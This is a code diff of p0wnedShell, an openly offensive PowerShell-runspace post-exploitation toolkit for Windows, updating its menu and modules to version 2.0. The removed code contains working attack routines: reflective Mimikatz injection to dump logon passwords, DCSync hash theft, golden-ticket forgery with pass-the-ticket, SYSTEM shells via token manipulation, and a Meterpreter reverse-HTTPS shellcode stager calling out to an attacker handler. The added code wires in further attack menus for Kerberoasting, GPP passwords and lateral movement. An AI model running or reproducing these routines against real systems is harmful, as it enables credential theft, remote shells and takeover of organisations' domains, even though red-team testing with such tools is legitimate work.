@@ -5,12 +5,12 @@
 *   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *
 *  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *
 * /_/                                                               *
-*                                    By Cn33liz and Skons 2017      *
+*                                    By Cn33liz and Skons 2018      *
 *                                                                   *
 * PowerShell Runspace Post Exploitation Toolkit                     *
-* For Bitch Ass Admins that tried to block our PowerShell candy ;)  *
+* A RedTeam Swiss Army Knife for Windows Based Systems              *
 *                                                                   *
-*                                                            v1.4.5 *
+*                                                            v2.0   *
 \*******************************************************************/
 
 /*
@@ -51,7 +51,7 @@ using System.DirectoryServices.ActiveDirectory;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-
+using System.Security.Principal;
 
 namespace p0wnedShell
 {
@@ -84,7 +84,7 @@ namespace p0wnedShell
             Console.WriteLine(@"*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *");
             Console.WriteLine(@"*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *");
             Console.WriteLine(@"* /_/                                                               *");
-            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2017\    *");
+            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2018\    *");
             Console.WriteLine(@"*                                       \Cornelis@dePlaa.com/       *");
             Console.WriteLine(@"*                                                                   *");
             if (toPrint != null)
@@ -94,10 +94,26 @@ namespace p0wnedShell
                     Console.WriteLine(item);
                 }
             }
-            Console.WriteLine(@"*                                                            v1.4.5 *");
+
+            string procArch = "x86";
+            if (Pshell.EnvironmentHelper.Is64BitProcess())
+            {
+                procArch = "x64";
+            }
+
+            Console.WriteLine(@"*                                                        v2.0  " + procArch + "  *");
             Console.WriteLine(@"*********************************************************************");
             Console.ResetColor();
             Console.WriteLine();
+        }
+
+        public static bool IsElevated
+        {
+            get
+            {
+                return WindowsIdentity.GetCurrent().Owner
+                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
+            }
         }
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
@@ -181,50 +197,49 @@ namespace p0wnedShell
         public static int DisplayMenu()
         {
             string[] toPrint = { "* PowerShell Runspace Post Exploitation Toolkit                     *",
-                                 "* For Bitch Ass Admins that tried to block our PowerShell candy ;)  *" };
+                                 "* A RedTeam Swiss Army Knife for Windows Based Systems              *" };
             Program.PrintBanner(toPrint);
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Information Gathering:\n");
             Console.ResetColor();
             Console.WriteLine(" 1. Use PowerView to gain network situational awareness on Windows Domains.");
-            Console.WriteLine(" 2. Find machines in the Domain where Domain Admins are logged into.");
+            Console.WriteLine(" 2. Use Invoke-UserHunter and/or BloodHound to identify AD Attack Paths.");
             Console.WriteLine(" 3. Scan for IP-Addresses, HostNames and open Ports in your Network.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Code Execution:\n");
             Console.ResetColor();
-            Console.WriteLine(" 4. Reflectively load Mimikatz executable into Memory, bypassing AV/AppLocker.");
-            Console.WriteLine(" 5. Inject Metasploit reversed https Shellcode into Memory.");
+            Console.WriteLine(" 4. Reflectively load Mimikatz or ReactOS into Memory, bypassing AV/AppLocker.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Privilege Escalation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 6. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
-            Console.WriteLine(" 7. Get a SYSTEM shell using Token Manipulation.");
-            Console.WriteLine(" 8. Tater \"The Posh Hot Potato\" Windows Privilege Escalation exploit.");
-            Console.WriteLine(" 9. Use Mimikatz dcsync to collect NTLM hashes from the Domain.");
-            Console.WriteLine(" 10. Use Mimikatz to generate a Golden Ticket for the Domain.");
+            Console.WriteLine(" 5. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
+            Console.WriteLine(" 6. Get a SYSTEM shell using EasySystem or Token Manipulation.");
+            Console.WriteLine(" 7. Inveigh a PowerShell based LLMNR/mDNS/NBNS Spoofer/Man-In-The-Middle tool.");
+            Console.WriteLine(" 8. Exploiting Group Policy Preference settings");
+            Console.WriteLine(" 9. Use Invoke-Kerberoast to get Crackable AD Service Account Hashes.");
+            Console.WriteLine(" 10. Attacking Active Directory using Mimikatz.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Exploitation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 11. Get into Ring0 using the MS14-058, MS15-051 and MS16-032 Vulnerability.");
+            Console.WriteLine(" 11. Get SYSTEM Privileges using various Exploits/Vulnerabilities.");
             Console.WriteLine(" 12. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("[*] Lateral Movement:\n");
+            Console.WriteLine("[*] Command & Control and Lateral Movement:\n");
             Console.ResetColor();
-            Console.WriteLine(" 13. Use PsExec to execute commands on remote system.");
-            Console.WriteLine(" 14. Execute Mimikatz on a remote computer to dump credentials.");
+            Console.WriteLine(" 13. Execute Metasploit reversed https Stager or Inject as Shellcode.");
+            Console.WriteLine(" 14. Use WinRM, PsExec or SMB/WMI (PtH) to execute commands on remote systems.");
             Console.WriteLine(" 15. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Others:\n");
             Console.ResetColor();
-            Console.WriteLine(" 16. Execute (Offensive) PowerShell Commands.");
-            Console.WriteLine(" 17. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
+            Console.WriteLine(" 16. Execute (Offensive) PowerShell Scripts and Commands.");
             Console.WriteLine();
-            Console.WriteLine(" 18. Exit");
+            Console.WriteLine(" 17. Exit");
             Console.Write("\nEnter choice: ");
             var result = Console.ReadLine();
 
@@ -241,7 +256,7 @@ namespace p0wnedShell
         public static void Main()
         {
             Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
-            Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(65, Console.LargestWindowHeight));
+            Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(55, Console.LargestWindowHeight));
             string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
             string LatestOSVersion = "6.3";
             decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
@@ -261,78 +276,34 @@ namespace p0wnedShell
                         Pshell.PowerView();
                         break;
                     case 2:
-                        Pshell.AdminHunter();
+                        SitAwareness.Menu();
                         break;
                     case 3:
                         Pshell.PortScan();
                         break;
                     case 4:
-                        if (Arch == "AMD64")
-                        {
-                            Pshell.MimiShell();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
+                        Execution.Menu();
                         break;
                     case 5:
-                        if (Arch == "x86")
-                        {
-                            Pshell.Meterpreter();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
-                        break;
-                    case 6:
                         Pshell.PowerUp();
                         break;
+                    case 6:
+                        GetSystem.Menu();
+                        break;
                     case 7:
-                        Pshell.SystemShell();
+                        Inveigh.Menu();
                         break;
                     case 8:
-                        Potato.TaterMenu();
+                        Pshell.GetGPPPassword();
                         break;
                     case 9:
-                        if (Arch == "AMD64")
-                        {
-                            Pshell.DCSync();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
+                        Roast.Menu();
                         break;
                     case 10:
-                        if (Arch == "AMD64")
-                        {
-                            Pshell.GoldenTicket();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
+                        ADAttacks.Menu();
                         break;
                     case 11:
-                        Exploits.ExploitMenu();
+                        Exploits.Menu();
                         break;
                     case 12:
                         if (Arch == "x86")
@@ -349,41 +320,16 @@ namespace p0wnedShell
                         }
                         break;
                     case 13:
-                        if (Arch == "x86")
-                        {
-                            Pshell.PsExec();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
+                        p0wnedMeter.Menu();
                         break;
                     case 14:
-                        Pshell.Remote_Mimikatz();
+                        LatMovement.Menu();
                         break;
                     case 15:
-                        PowerCat.PowerMenu();
+                        PowerCat.Menu();
                         break;
                     case 16:
                         Pshell.InvokeShell();
-                        break;
-                    case 17:
-                        if (Arch == "x86")
-                        {
-                            Pshell.ReactShell();
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
-                            Console.ResetColor();
-                            Console.WriteLine("Press Enter to Continue...");
-                            Console.ReadLine();
-                        }
                         break;
                     default:
                         Console.ForegroundColor = ConsoleColor.Red;
@@ -392,7 +338,7 @@ namespace p0wnedShell
                         break;
                 }
 
-            } while (userInput != 18);
+            } while (userInput != 17);
 
             if (File.Exists(Program.P0wnedPath() + "\\Amsi.dll"))
             {
@@ -487,263 +433,26 @@ namespace p0wnedShell
             Console.Write("[+] You can use Get-Credential in case you already have valid admin credentials\n\n");
             Console.Write("[+] The following Post Exploitation modules are loaded:\n\n");
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.Write("[+] PowerSploit Invoke-Shellcode\n");
-            Console.Write("[+] PowerSploit Invoke-ReflectivePEInjection\n");
-            Console.Write("[+] PowerSploit Invoke-Mimikatz\n");
-            Console.Write("[+] PowerSploit Invoke-TokenManipulation\n");
-            Console.Write("[+] PowerSploit PowerUp\n");
-            Console.Write("[+] PowerSploit PowerView\n");
-            Console.Write("[+] HarmJ0y's Invoke-Psexec\n");
-            Console.Write("[+] Besimorhino's PowerCat\n");
-            Console.Write("[+] Nishang Invoke-PsUACme\n");
-            Console.Write("[+] Nishang Invoke-Encode\n");
-            Console.Write("[+] Nishang Get-PassHashes\n");
-            Console.Write("[+] Nishang Invoke-CredentialsPhish\n");
-            Console.Write("[+] Nishang Port-Scan\n");
-            Console.Write("[+] Nishang Copy-VSS\n");
-            Console.Write("[+] Kevin Robertson Invoke-Tater\n");
-            Console.Write("[+] Kevin Robertson Invoke-Inveigh, Invoke-InveighUnprivileged and Invoke-InveighRelay\n");
-            Console.Write("[+] FuzzySecurity Invoke-MS16-032\n\n");
+            Console.Write("[+] PowerSploit: Invoke-Shellcode\n");
+            Console.Write("[+] PowerSploit: Invoke-ReflectivePEInjection\n");
+            Console.Write("[+] PowerSploit: Invoke-Mimikatz\n");
+            Console.Write("[+] PowerSploit: Invoke-TokenManipulation\n");
+            Console.Write("[+] PowerSploit: PowerUp and PowerView\n");
+            Console.Write("[+] Rasta Mouse: Sherlock\n");
+            Console.Write("[+] HarmJ0y's: Invoke-Psexec and Invoke-Kerberoast\n");
+            Console.Write("[+] Rohan Vazarkar's: Invoke-BloodHound (C# Ingestor)\n");
+            Console.Write("[+] Chris Campbell's: Get-GPPPassword\n");
+            Console.Write("[+] Tim Medin's: GetUserSPNS\n");
+            Console.Write("[+] Besimorhino's: PowerCat\n");
+            Console.Write("[+] Nishang: Copy-VSS and Invoke-Encode\n");
+            Console.Write("[+] Nishang: Invoke-PortScan and Get-PassHashes\n");
+            Console.Write("[+] Kevin Robertson: Invoke-Tater, Invoke-SMBExec and Invoke-WMIExec\n");
+            Console.Write("[+] Kevin Robertson: Invoke-Inveigh and Invoke-InveighRelay\n");
+            Console.Write("[+] FuzzySecurity: Invoke-MS16-032 and Invoke-MS16-135\n\n");
             Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n\n");
             Console.ResetColor();
 
             P0wnedListener.CommandShell();
-        }
-
-        public static void MimiShell()
-        {
-            string[] toPrint = { "* Inject Mimikatz Binary into memory using ReflectivePEInjection    *" };
-            Program.PrintBanner(toPrint);
-
-            Console.WriteLine("[+] Please wait until loaded...\n");
-
-            string InvokeMimikatz = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs \"privilege::debug sekurlsa::logonpasswords\" -Verbose";
-            try
-            {
-                P0wnedListener.Execute(InvokeMimikatz);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            return;
-        }
-
-        public static void DCSync()
-        {
-            string[] toPrint = { "* Use Mimikatz dcsync to collect NTLM hashes from the Domain        *" };
-            Program.PrintBanner(toPrint);
-
-            Console.WriteLine("\n[+] For this attack to succeed, you need the Replicating Directory Changes account privileges (DSGetNCChanges).");
-            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
-            string User = null;
-            string input = Console.ReadLine();
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.Write("\n[+] Please enter the name of the account from which we want the NTLM hash (e.g. krbtgt) > ");
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    User = Console.ReadLine().TrimEnd('\r', '\n');
-                    Console.ResetColor();
-                    if (User == "")
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                        return;
-                    }
-                    break;
-                case "n":
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-            }
-
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.Write("\n[+] Please wait while requesting our hash...\n\n");
-            Console.ResetColor();
-
-            //string DCSync = "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:"+User+"\"'";
-            string DCSync = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs '\"lsadump::dcsync /user:" + User + "\"'";
-            try
-            {
-                P0wnedListener.Execute(DCSync);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            return;
-        }
-
-        public static void GoldenTicket()
-        {
-            string[] toPrint = { "* Use Mimikatz to generate a Golden Ticket for the Domain           *" };
-            Program.PrintBanner(toPrint);
-
-            string DomainJoined = String.Empty;
-            try
-            {
-                DomainJoined = Domain.GetComputerDomain().Name;
-            }
-            catch
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                return;
-            }
-
-            Domain domain = Domain.GetCurrentDomain();
-            DomainController Current_DC = domain.PdcRoleOwner;
-            string DomainName = domain.ToString();
-
-            Console.WriteLine("[+] First return the name of our current domain.\n");
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine(DomainName);
-            Console.ResetColor();
-
-            Console.WriteLine("\n[+] Now return the SID for our domain.\n");
-            string DomainSID = Pshell.RunPSCommand("Get-DomainSID").ToString().TrimEnd('\r', '\n');
-
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine(DomainSID);
-            Console.ResetColor();
-
-            Console.WriteLine("\n[+] For this attack to succeed, we need to have the ntlm hash of the krbtgt account.");
-            Console.Write("[+] Do you have the ntlm hash of the krbtgt account? (y/n) > ");
-            string krbtgt_hash = null;
-            string input = Console.ReadLine();
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.Write("\n[+] Please enter the hash of our sweet krbtgt account > ");
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    krbtgt_hash = Console.ReadLine();
-                    Console.ResetColor();
-                    if (krbtgt_hash.Length != 32)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] This is not a valid ntlm hash, please try again\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                        return;
-                    }
-                    break;
-                case "n":
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] First try to get this hash using Mimikatz DCSync or a NTDS.dit dump.\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-            }
-
-            Console.Write("\n[+] Now enter the name of the Super Human you want to be: ");
-            Console.ForegroundColor = ConsoleColor.Green;
-            string Super_Hero = Console.ReadLine();
-            Console.ResetColor();
-
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("\n[+] Now wait while generating a forged Ticket-Granting Ticket (TGT)...\n");
-            Console.ResetColor();
-
-            string Golden_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\" \"kerberos::golden /domain:" + DomainName + " /user:" + Super_Hero + " /sid:" + DomainSID + " /krbtgt:" + krbtgt_hash + " /ticket:" + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
-            try
-            {
-                Console.WriteLine(RunPSCommand(Golden_Ticket));
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-
-            if (File.Exists(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket"))
-            {
-                string Pass_The_Ticket = "Invoke-Mimikatz -Command '\"kerberos::ptt " + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Now lets inject our Kerberos ticket in the current session\n");
-                Console.ResetColor();
-                try
-                {
-                    Console.WriteLine(RunPSCommand(Pass_The_Ticket));
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-            }
-            else
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Oops something went wrong, please try again!\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                return;
-            }
-            string DC_Listing = "Get-ChildItem \\\\" + Current_DC + "\\C$";
-            string SuperPower = null;
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("\n[+] And finally check if we really have SuperPower:\n");
-            Console.ResetColor();
-            try
-            {
-                SuperPower = RunPSCommand(DC_Listing);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            if (SuperPower.Length <= 5)
-            {
-                string Purge_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\"'";
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Oops something went wrong, probably a wrong krbtgt Hash? Please try again!\n");
-                Console.WriteLine("[+] Let's purge our invalid Ticket!\n");
-                Console.ResetColor();
-                File.Delete(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket");
-                try
-                {
-                    Console.WriteLine(RunPSCommand(Purge_Ticket));
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-            }
-            else
-            {
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("\n[+] OwYeah, " + Super_Hero + " you are in Full Control of the Domain :)\n");
-                Console.ResetColor();
-                Console.WriteLine(RunPSCommand(DC_Listing));
-            }
-            Console.WriteLine("Press Enter to Continue...");
-            Console.ReadLine();
-            return;
         }
 
         public static void MS14_068()
@@ -830,7 +539,7 @@ namespace p0wnedShell
             Console.WriteLine("\n[+] Now wait while re-writing our user ticket to be a Domain Admin ticket (forged PAC)...\n");
             Console.ResetColor();
 
-            string MS14_068 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS14_068() + "\" -split ' ') -ExeArgs \"/domain:" + DomainName + " /user:" + User + " /password:" + Password + " /ptt\" -Verbose";
+            string MS14_068 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS14_068() + "\" -split ' ') -ExeArgs \"/domain:" + DomainName + " /user:" + User + " /password:" + Password + " /ptt\"";
             try
             {
                 P0wnedListener.Execute(MS14_068);
@@ -871,172 +580,6 @@ namespace p0wnedShell
             return;
         }
 
-        public static void Meterpreter()
-        {
-            string[] toPrint = { "* Inject Metasploit reversed https Shellcode into Memory            *" };
-            Program.PrintBanner(toPrint);
-
-            IPAddress Lhost = IPAddress.Parse("1.1.1.1");
-            int Lport = 0;
-
-            while (true)
-            {
-                try
-                {
-                    Console.Write("Enter ip address of your Meterpreter handler (e.g. 1.1.1.1): ");
-                    Lhost = IPAddress.Parse(Console.ReadLine());
-                    Console.WriteLine();
-                    break;
-                }
-                catch
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
-                    Console.ResetColor();
-                }
-            }
-
-            while (true)
-            {
-                try
-                {
-                    Console.Write("Now Enter the listening port of your Meterpreter handler (e.g. 443 or 8443): ");
-                    Lport = int.Parse(Console.ReadLine());
-                    Console.WriteLine();
-
-                    if (Lport < 1 || Lport > 65535)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
-                        Console.ResetColor();
-                    }
-                    else
-                    {
-                        break;
-                    }
-                }
-                catch
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
-                    Console.ResetColor();
-                }
-            }
-
-            string InvokeReverseShell = "";
-            string WebProxy = Program.DetectProxy();
-
-            if (WebProxy != null)
-            {
-                Console.Write("\n\n[+] The following web Proxy is detected: ");
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("{0}", WebProxy);
-                Console.ResetColor();
-                Console.WriteLine();
-                Console.Write("\n[+] Do you want to use this proxy? (y/n) > ");
-                string input = Console.ReadLine();
-                switch (input.ToLower())
-                {
-                    case "y":
-                        InvokeReverseShell = "[net.webrequest]::defaultwebproxy = new-object net.webproxy \"" + WebProxy + "\" ;" +
-                                             "[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials ;" +
-                                             "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
-                        break;
-                    case "n":
-                        InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
-                        break;
-                    default:
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                        Console.ResetColor();
-                        Console.WriteLine("Press Enter to Continue...");
-                        Console.ReadLine();
-                        return;
-                }
-            }
-            else
-            {
-                InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force";
-            }
-
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("\n\n[+] Now make sure you setup your remote Meterpreter handler as follow:\n");
-            Console.ResetColor();
-            Console.WriteLine(@"[root@P0wnedHost ~]# msfconsole  ");
-            Console.WriteLine(@"                                 ");
-            Console.WriteLine(@"     ,           ,               ");
-            Console.WriteLine(@"    /             \              ");
-            Console.WriteLine(@"   ((__---,,,---__))             ");
-            Console.WriteLine(@"      (_) O O (_)_________       ");
-            Console.WriteLine(@"         \ _ /            |\     ");
-            Console.WriteLine(@"          o_o \   M S F   | \    ");
-            Console.WriteLine(@"               \   _____  |  *   ");
-            Console.WriteLine(@"                |||   WW|||      ");
-            Console.WriteLine(@"                |||     |||      ");
-            Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("use exploit/multi/handler");
-            Console.WriteLine("set PAYLOAD windows/meterpreter/reverse_https");
-            Console.WriteLine("set LHOST " + Lhost);
-            Console.WriteLine("set LPORT " + Lport);
-            Console.WriteLine("set AutoRunScript post/windows/manage/smart_migrate");
-            Console.WriteLine("exploit");
-            Console.ResetColor();
-            Console.WriteLine("\nReady to Rumble? then Press Enter to continue and wait for Shell awesomeness :)");
-            Console.ReadLine();
-
-            try
-            {
-                P0wnedListener.Execute(InvokeReverseShell);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            return;
-
-        }
-
-        public static void SystemShell()
-        {
-            string[] toPrint = { "* Get a SYSTEM shell using Token Manipulation                       *" };
-            Program.PrintBanner(toPrint);
-
-            Console.WriteLine("[+] For this attack to succeed, you need Local Administrator account privileges.");
-            Console.Write("[+] Do you have the required permissions? (y/n) > ");
-            string input = Console.ReadLine();
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.WriteLine("[+] Please wait for our SYSTEM shell to Popup...\n");
-                    string SystemShell = "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"";
-                    try
-                    {
-                        P0wnedListener.Execute(SystemShell);
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e.Message);
-                    }
-                    break;
-                case "n":
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to Continue...");
-                    Console.ReadLine();
-                    return;
-            }
-            return;
-        }
-
         public static void PowerUp()
         {
             string[] toPrint = { "* Use PowerUp to assist with local privilege escalation.            *" };
@@ -1060,42 +603,7 @@ namespace p0wnedShell
             return;
         }
 
-        public static void AdminHunter()
-        {
-            string[] toPrint = { "* Finds machines in the Domain where Domain Admins are logged into. *" };
-            Program.PrintBanner(toPrint);
-
-            string DomainJoined = String.Empty;
-            try
-            {
-                DomainJoined = Domain.GetComputerDomain().Name;
-            }
-            catch
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                return;
-            }
-
-            Console.Write("[+] Please wait, this could take a while on large Domains...\n");
-
-            string UserHunter = "Invoke-UserHunter -CheckAccess";
-            try
-            {
-                P0wnedListener.Execute(UserHunter);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            Console.WriteLine("\nPress Enter to Continue...");
-            Console.ReadLine();
-            return;
-        }
-
+        
         public static void PowerView()
         {
             string[] toPrint = { "* Gain network situational awareness on Windows Domains.            *" };
@@ -1123,6 +631,7 @@ namespace p0wnedShell
             string DomainSID = "Get-DomainSID";
             string NetDomainTrust = "Get-NetDomainTrust";
             string MapDomainTrust = "Invoke-MapDomainTrust -LDAP";
+            string NetGroupMember = "Get-NetGroupMember";
             try
             {
                 Console.ForegroundColor = ConsoleColor.Red;
@@ -1150,6 +659,13 @@ namespace p0wnedShell
                 Console.WriteLine("[+] Getting the name of the current user's domain.\n");
                 Console.ResetColor();
                 Console.WriteLine(RunPSCommand(NetDomain));
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[+] Get a list of all Members in the Domain Admin group.\n");
+                Console.ResetColor();
+                Console.WriteLine(RunPSCommand(NetGroupMember));
                 Console.WriteLine("Press Enter to Continue...");
                 Console.ReadLine();
 
@@ -1265,7 +781,7 @@ namespace p0wnedShell
             Console.WriteLine("\n[+] Please wait while running our scan...\n");
             Console.ResetColor();
 
-            string PortScan = "Port-Scan -StartAddress " + Start + " -EndAddress " + End + " -ResolveHost -ScanPort -Port " + Ports + " | ft -autosize";
+            string PortScan = "Invoke-PortScan -StartAddress " + Start + " -EndAddress " + End + " -ResolveHost -ScanPort -Port " + Ports + " | ft -autosize";
             try
             {
                 P0wnedListener.Execute(PortScan);
@@ -1280,198 +796,40 @@ namespace p0wnedShell
             return;
         }
 
-        public static void PsExec()
+        public static void GetGPPPassword()
         {
-            string[] toPrint = { "* Use PsExec to execute commands on remote system.                  *" };
+            string[] toPrint = { "* Exploiting Group Policy Preference settings                       *" };
             Program.PrintBanner(toPrint);
 
-            Console.WriteLine("\n[+] For this attack to succeed, you need to have Admin privileges.");
-            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
-            string Hostname = null;
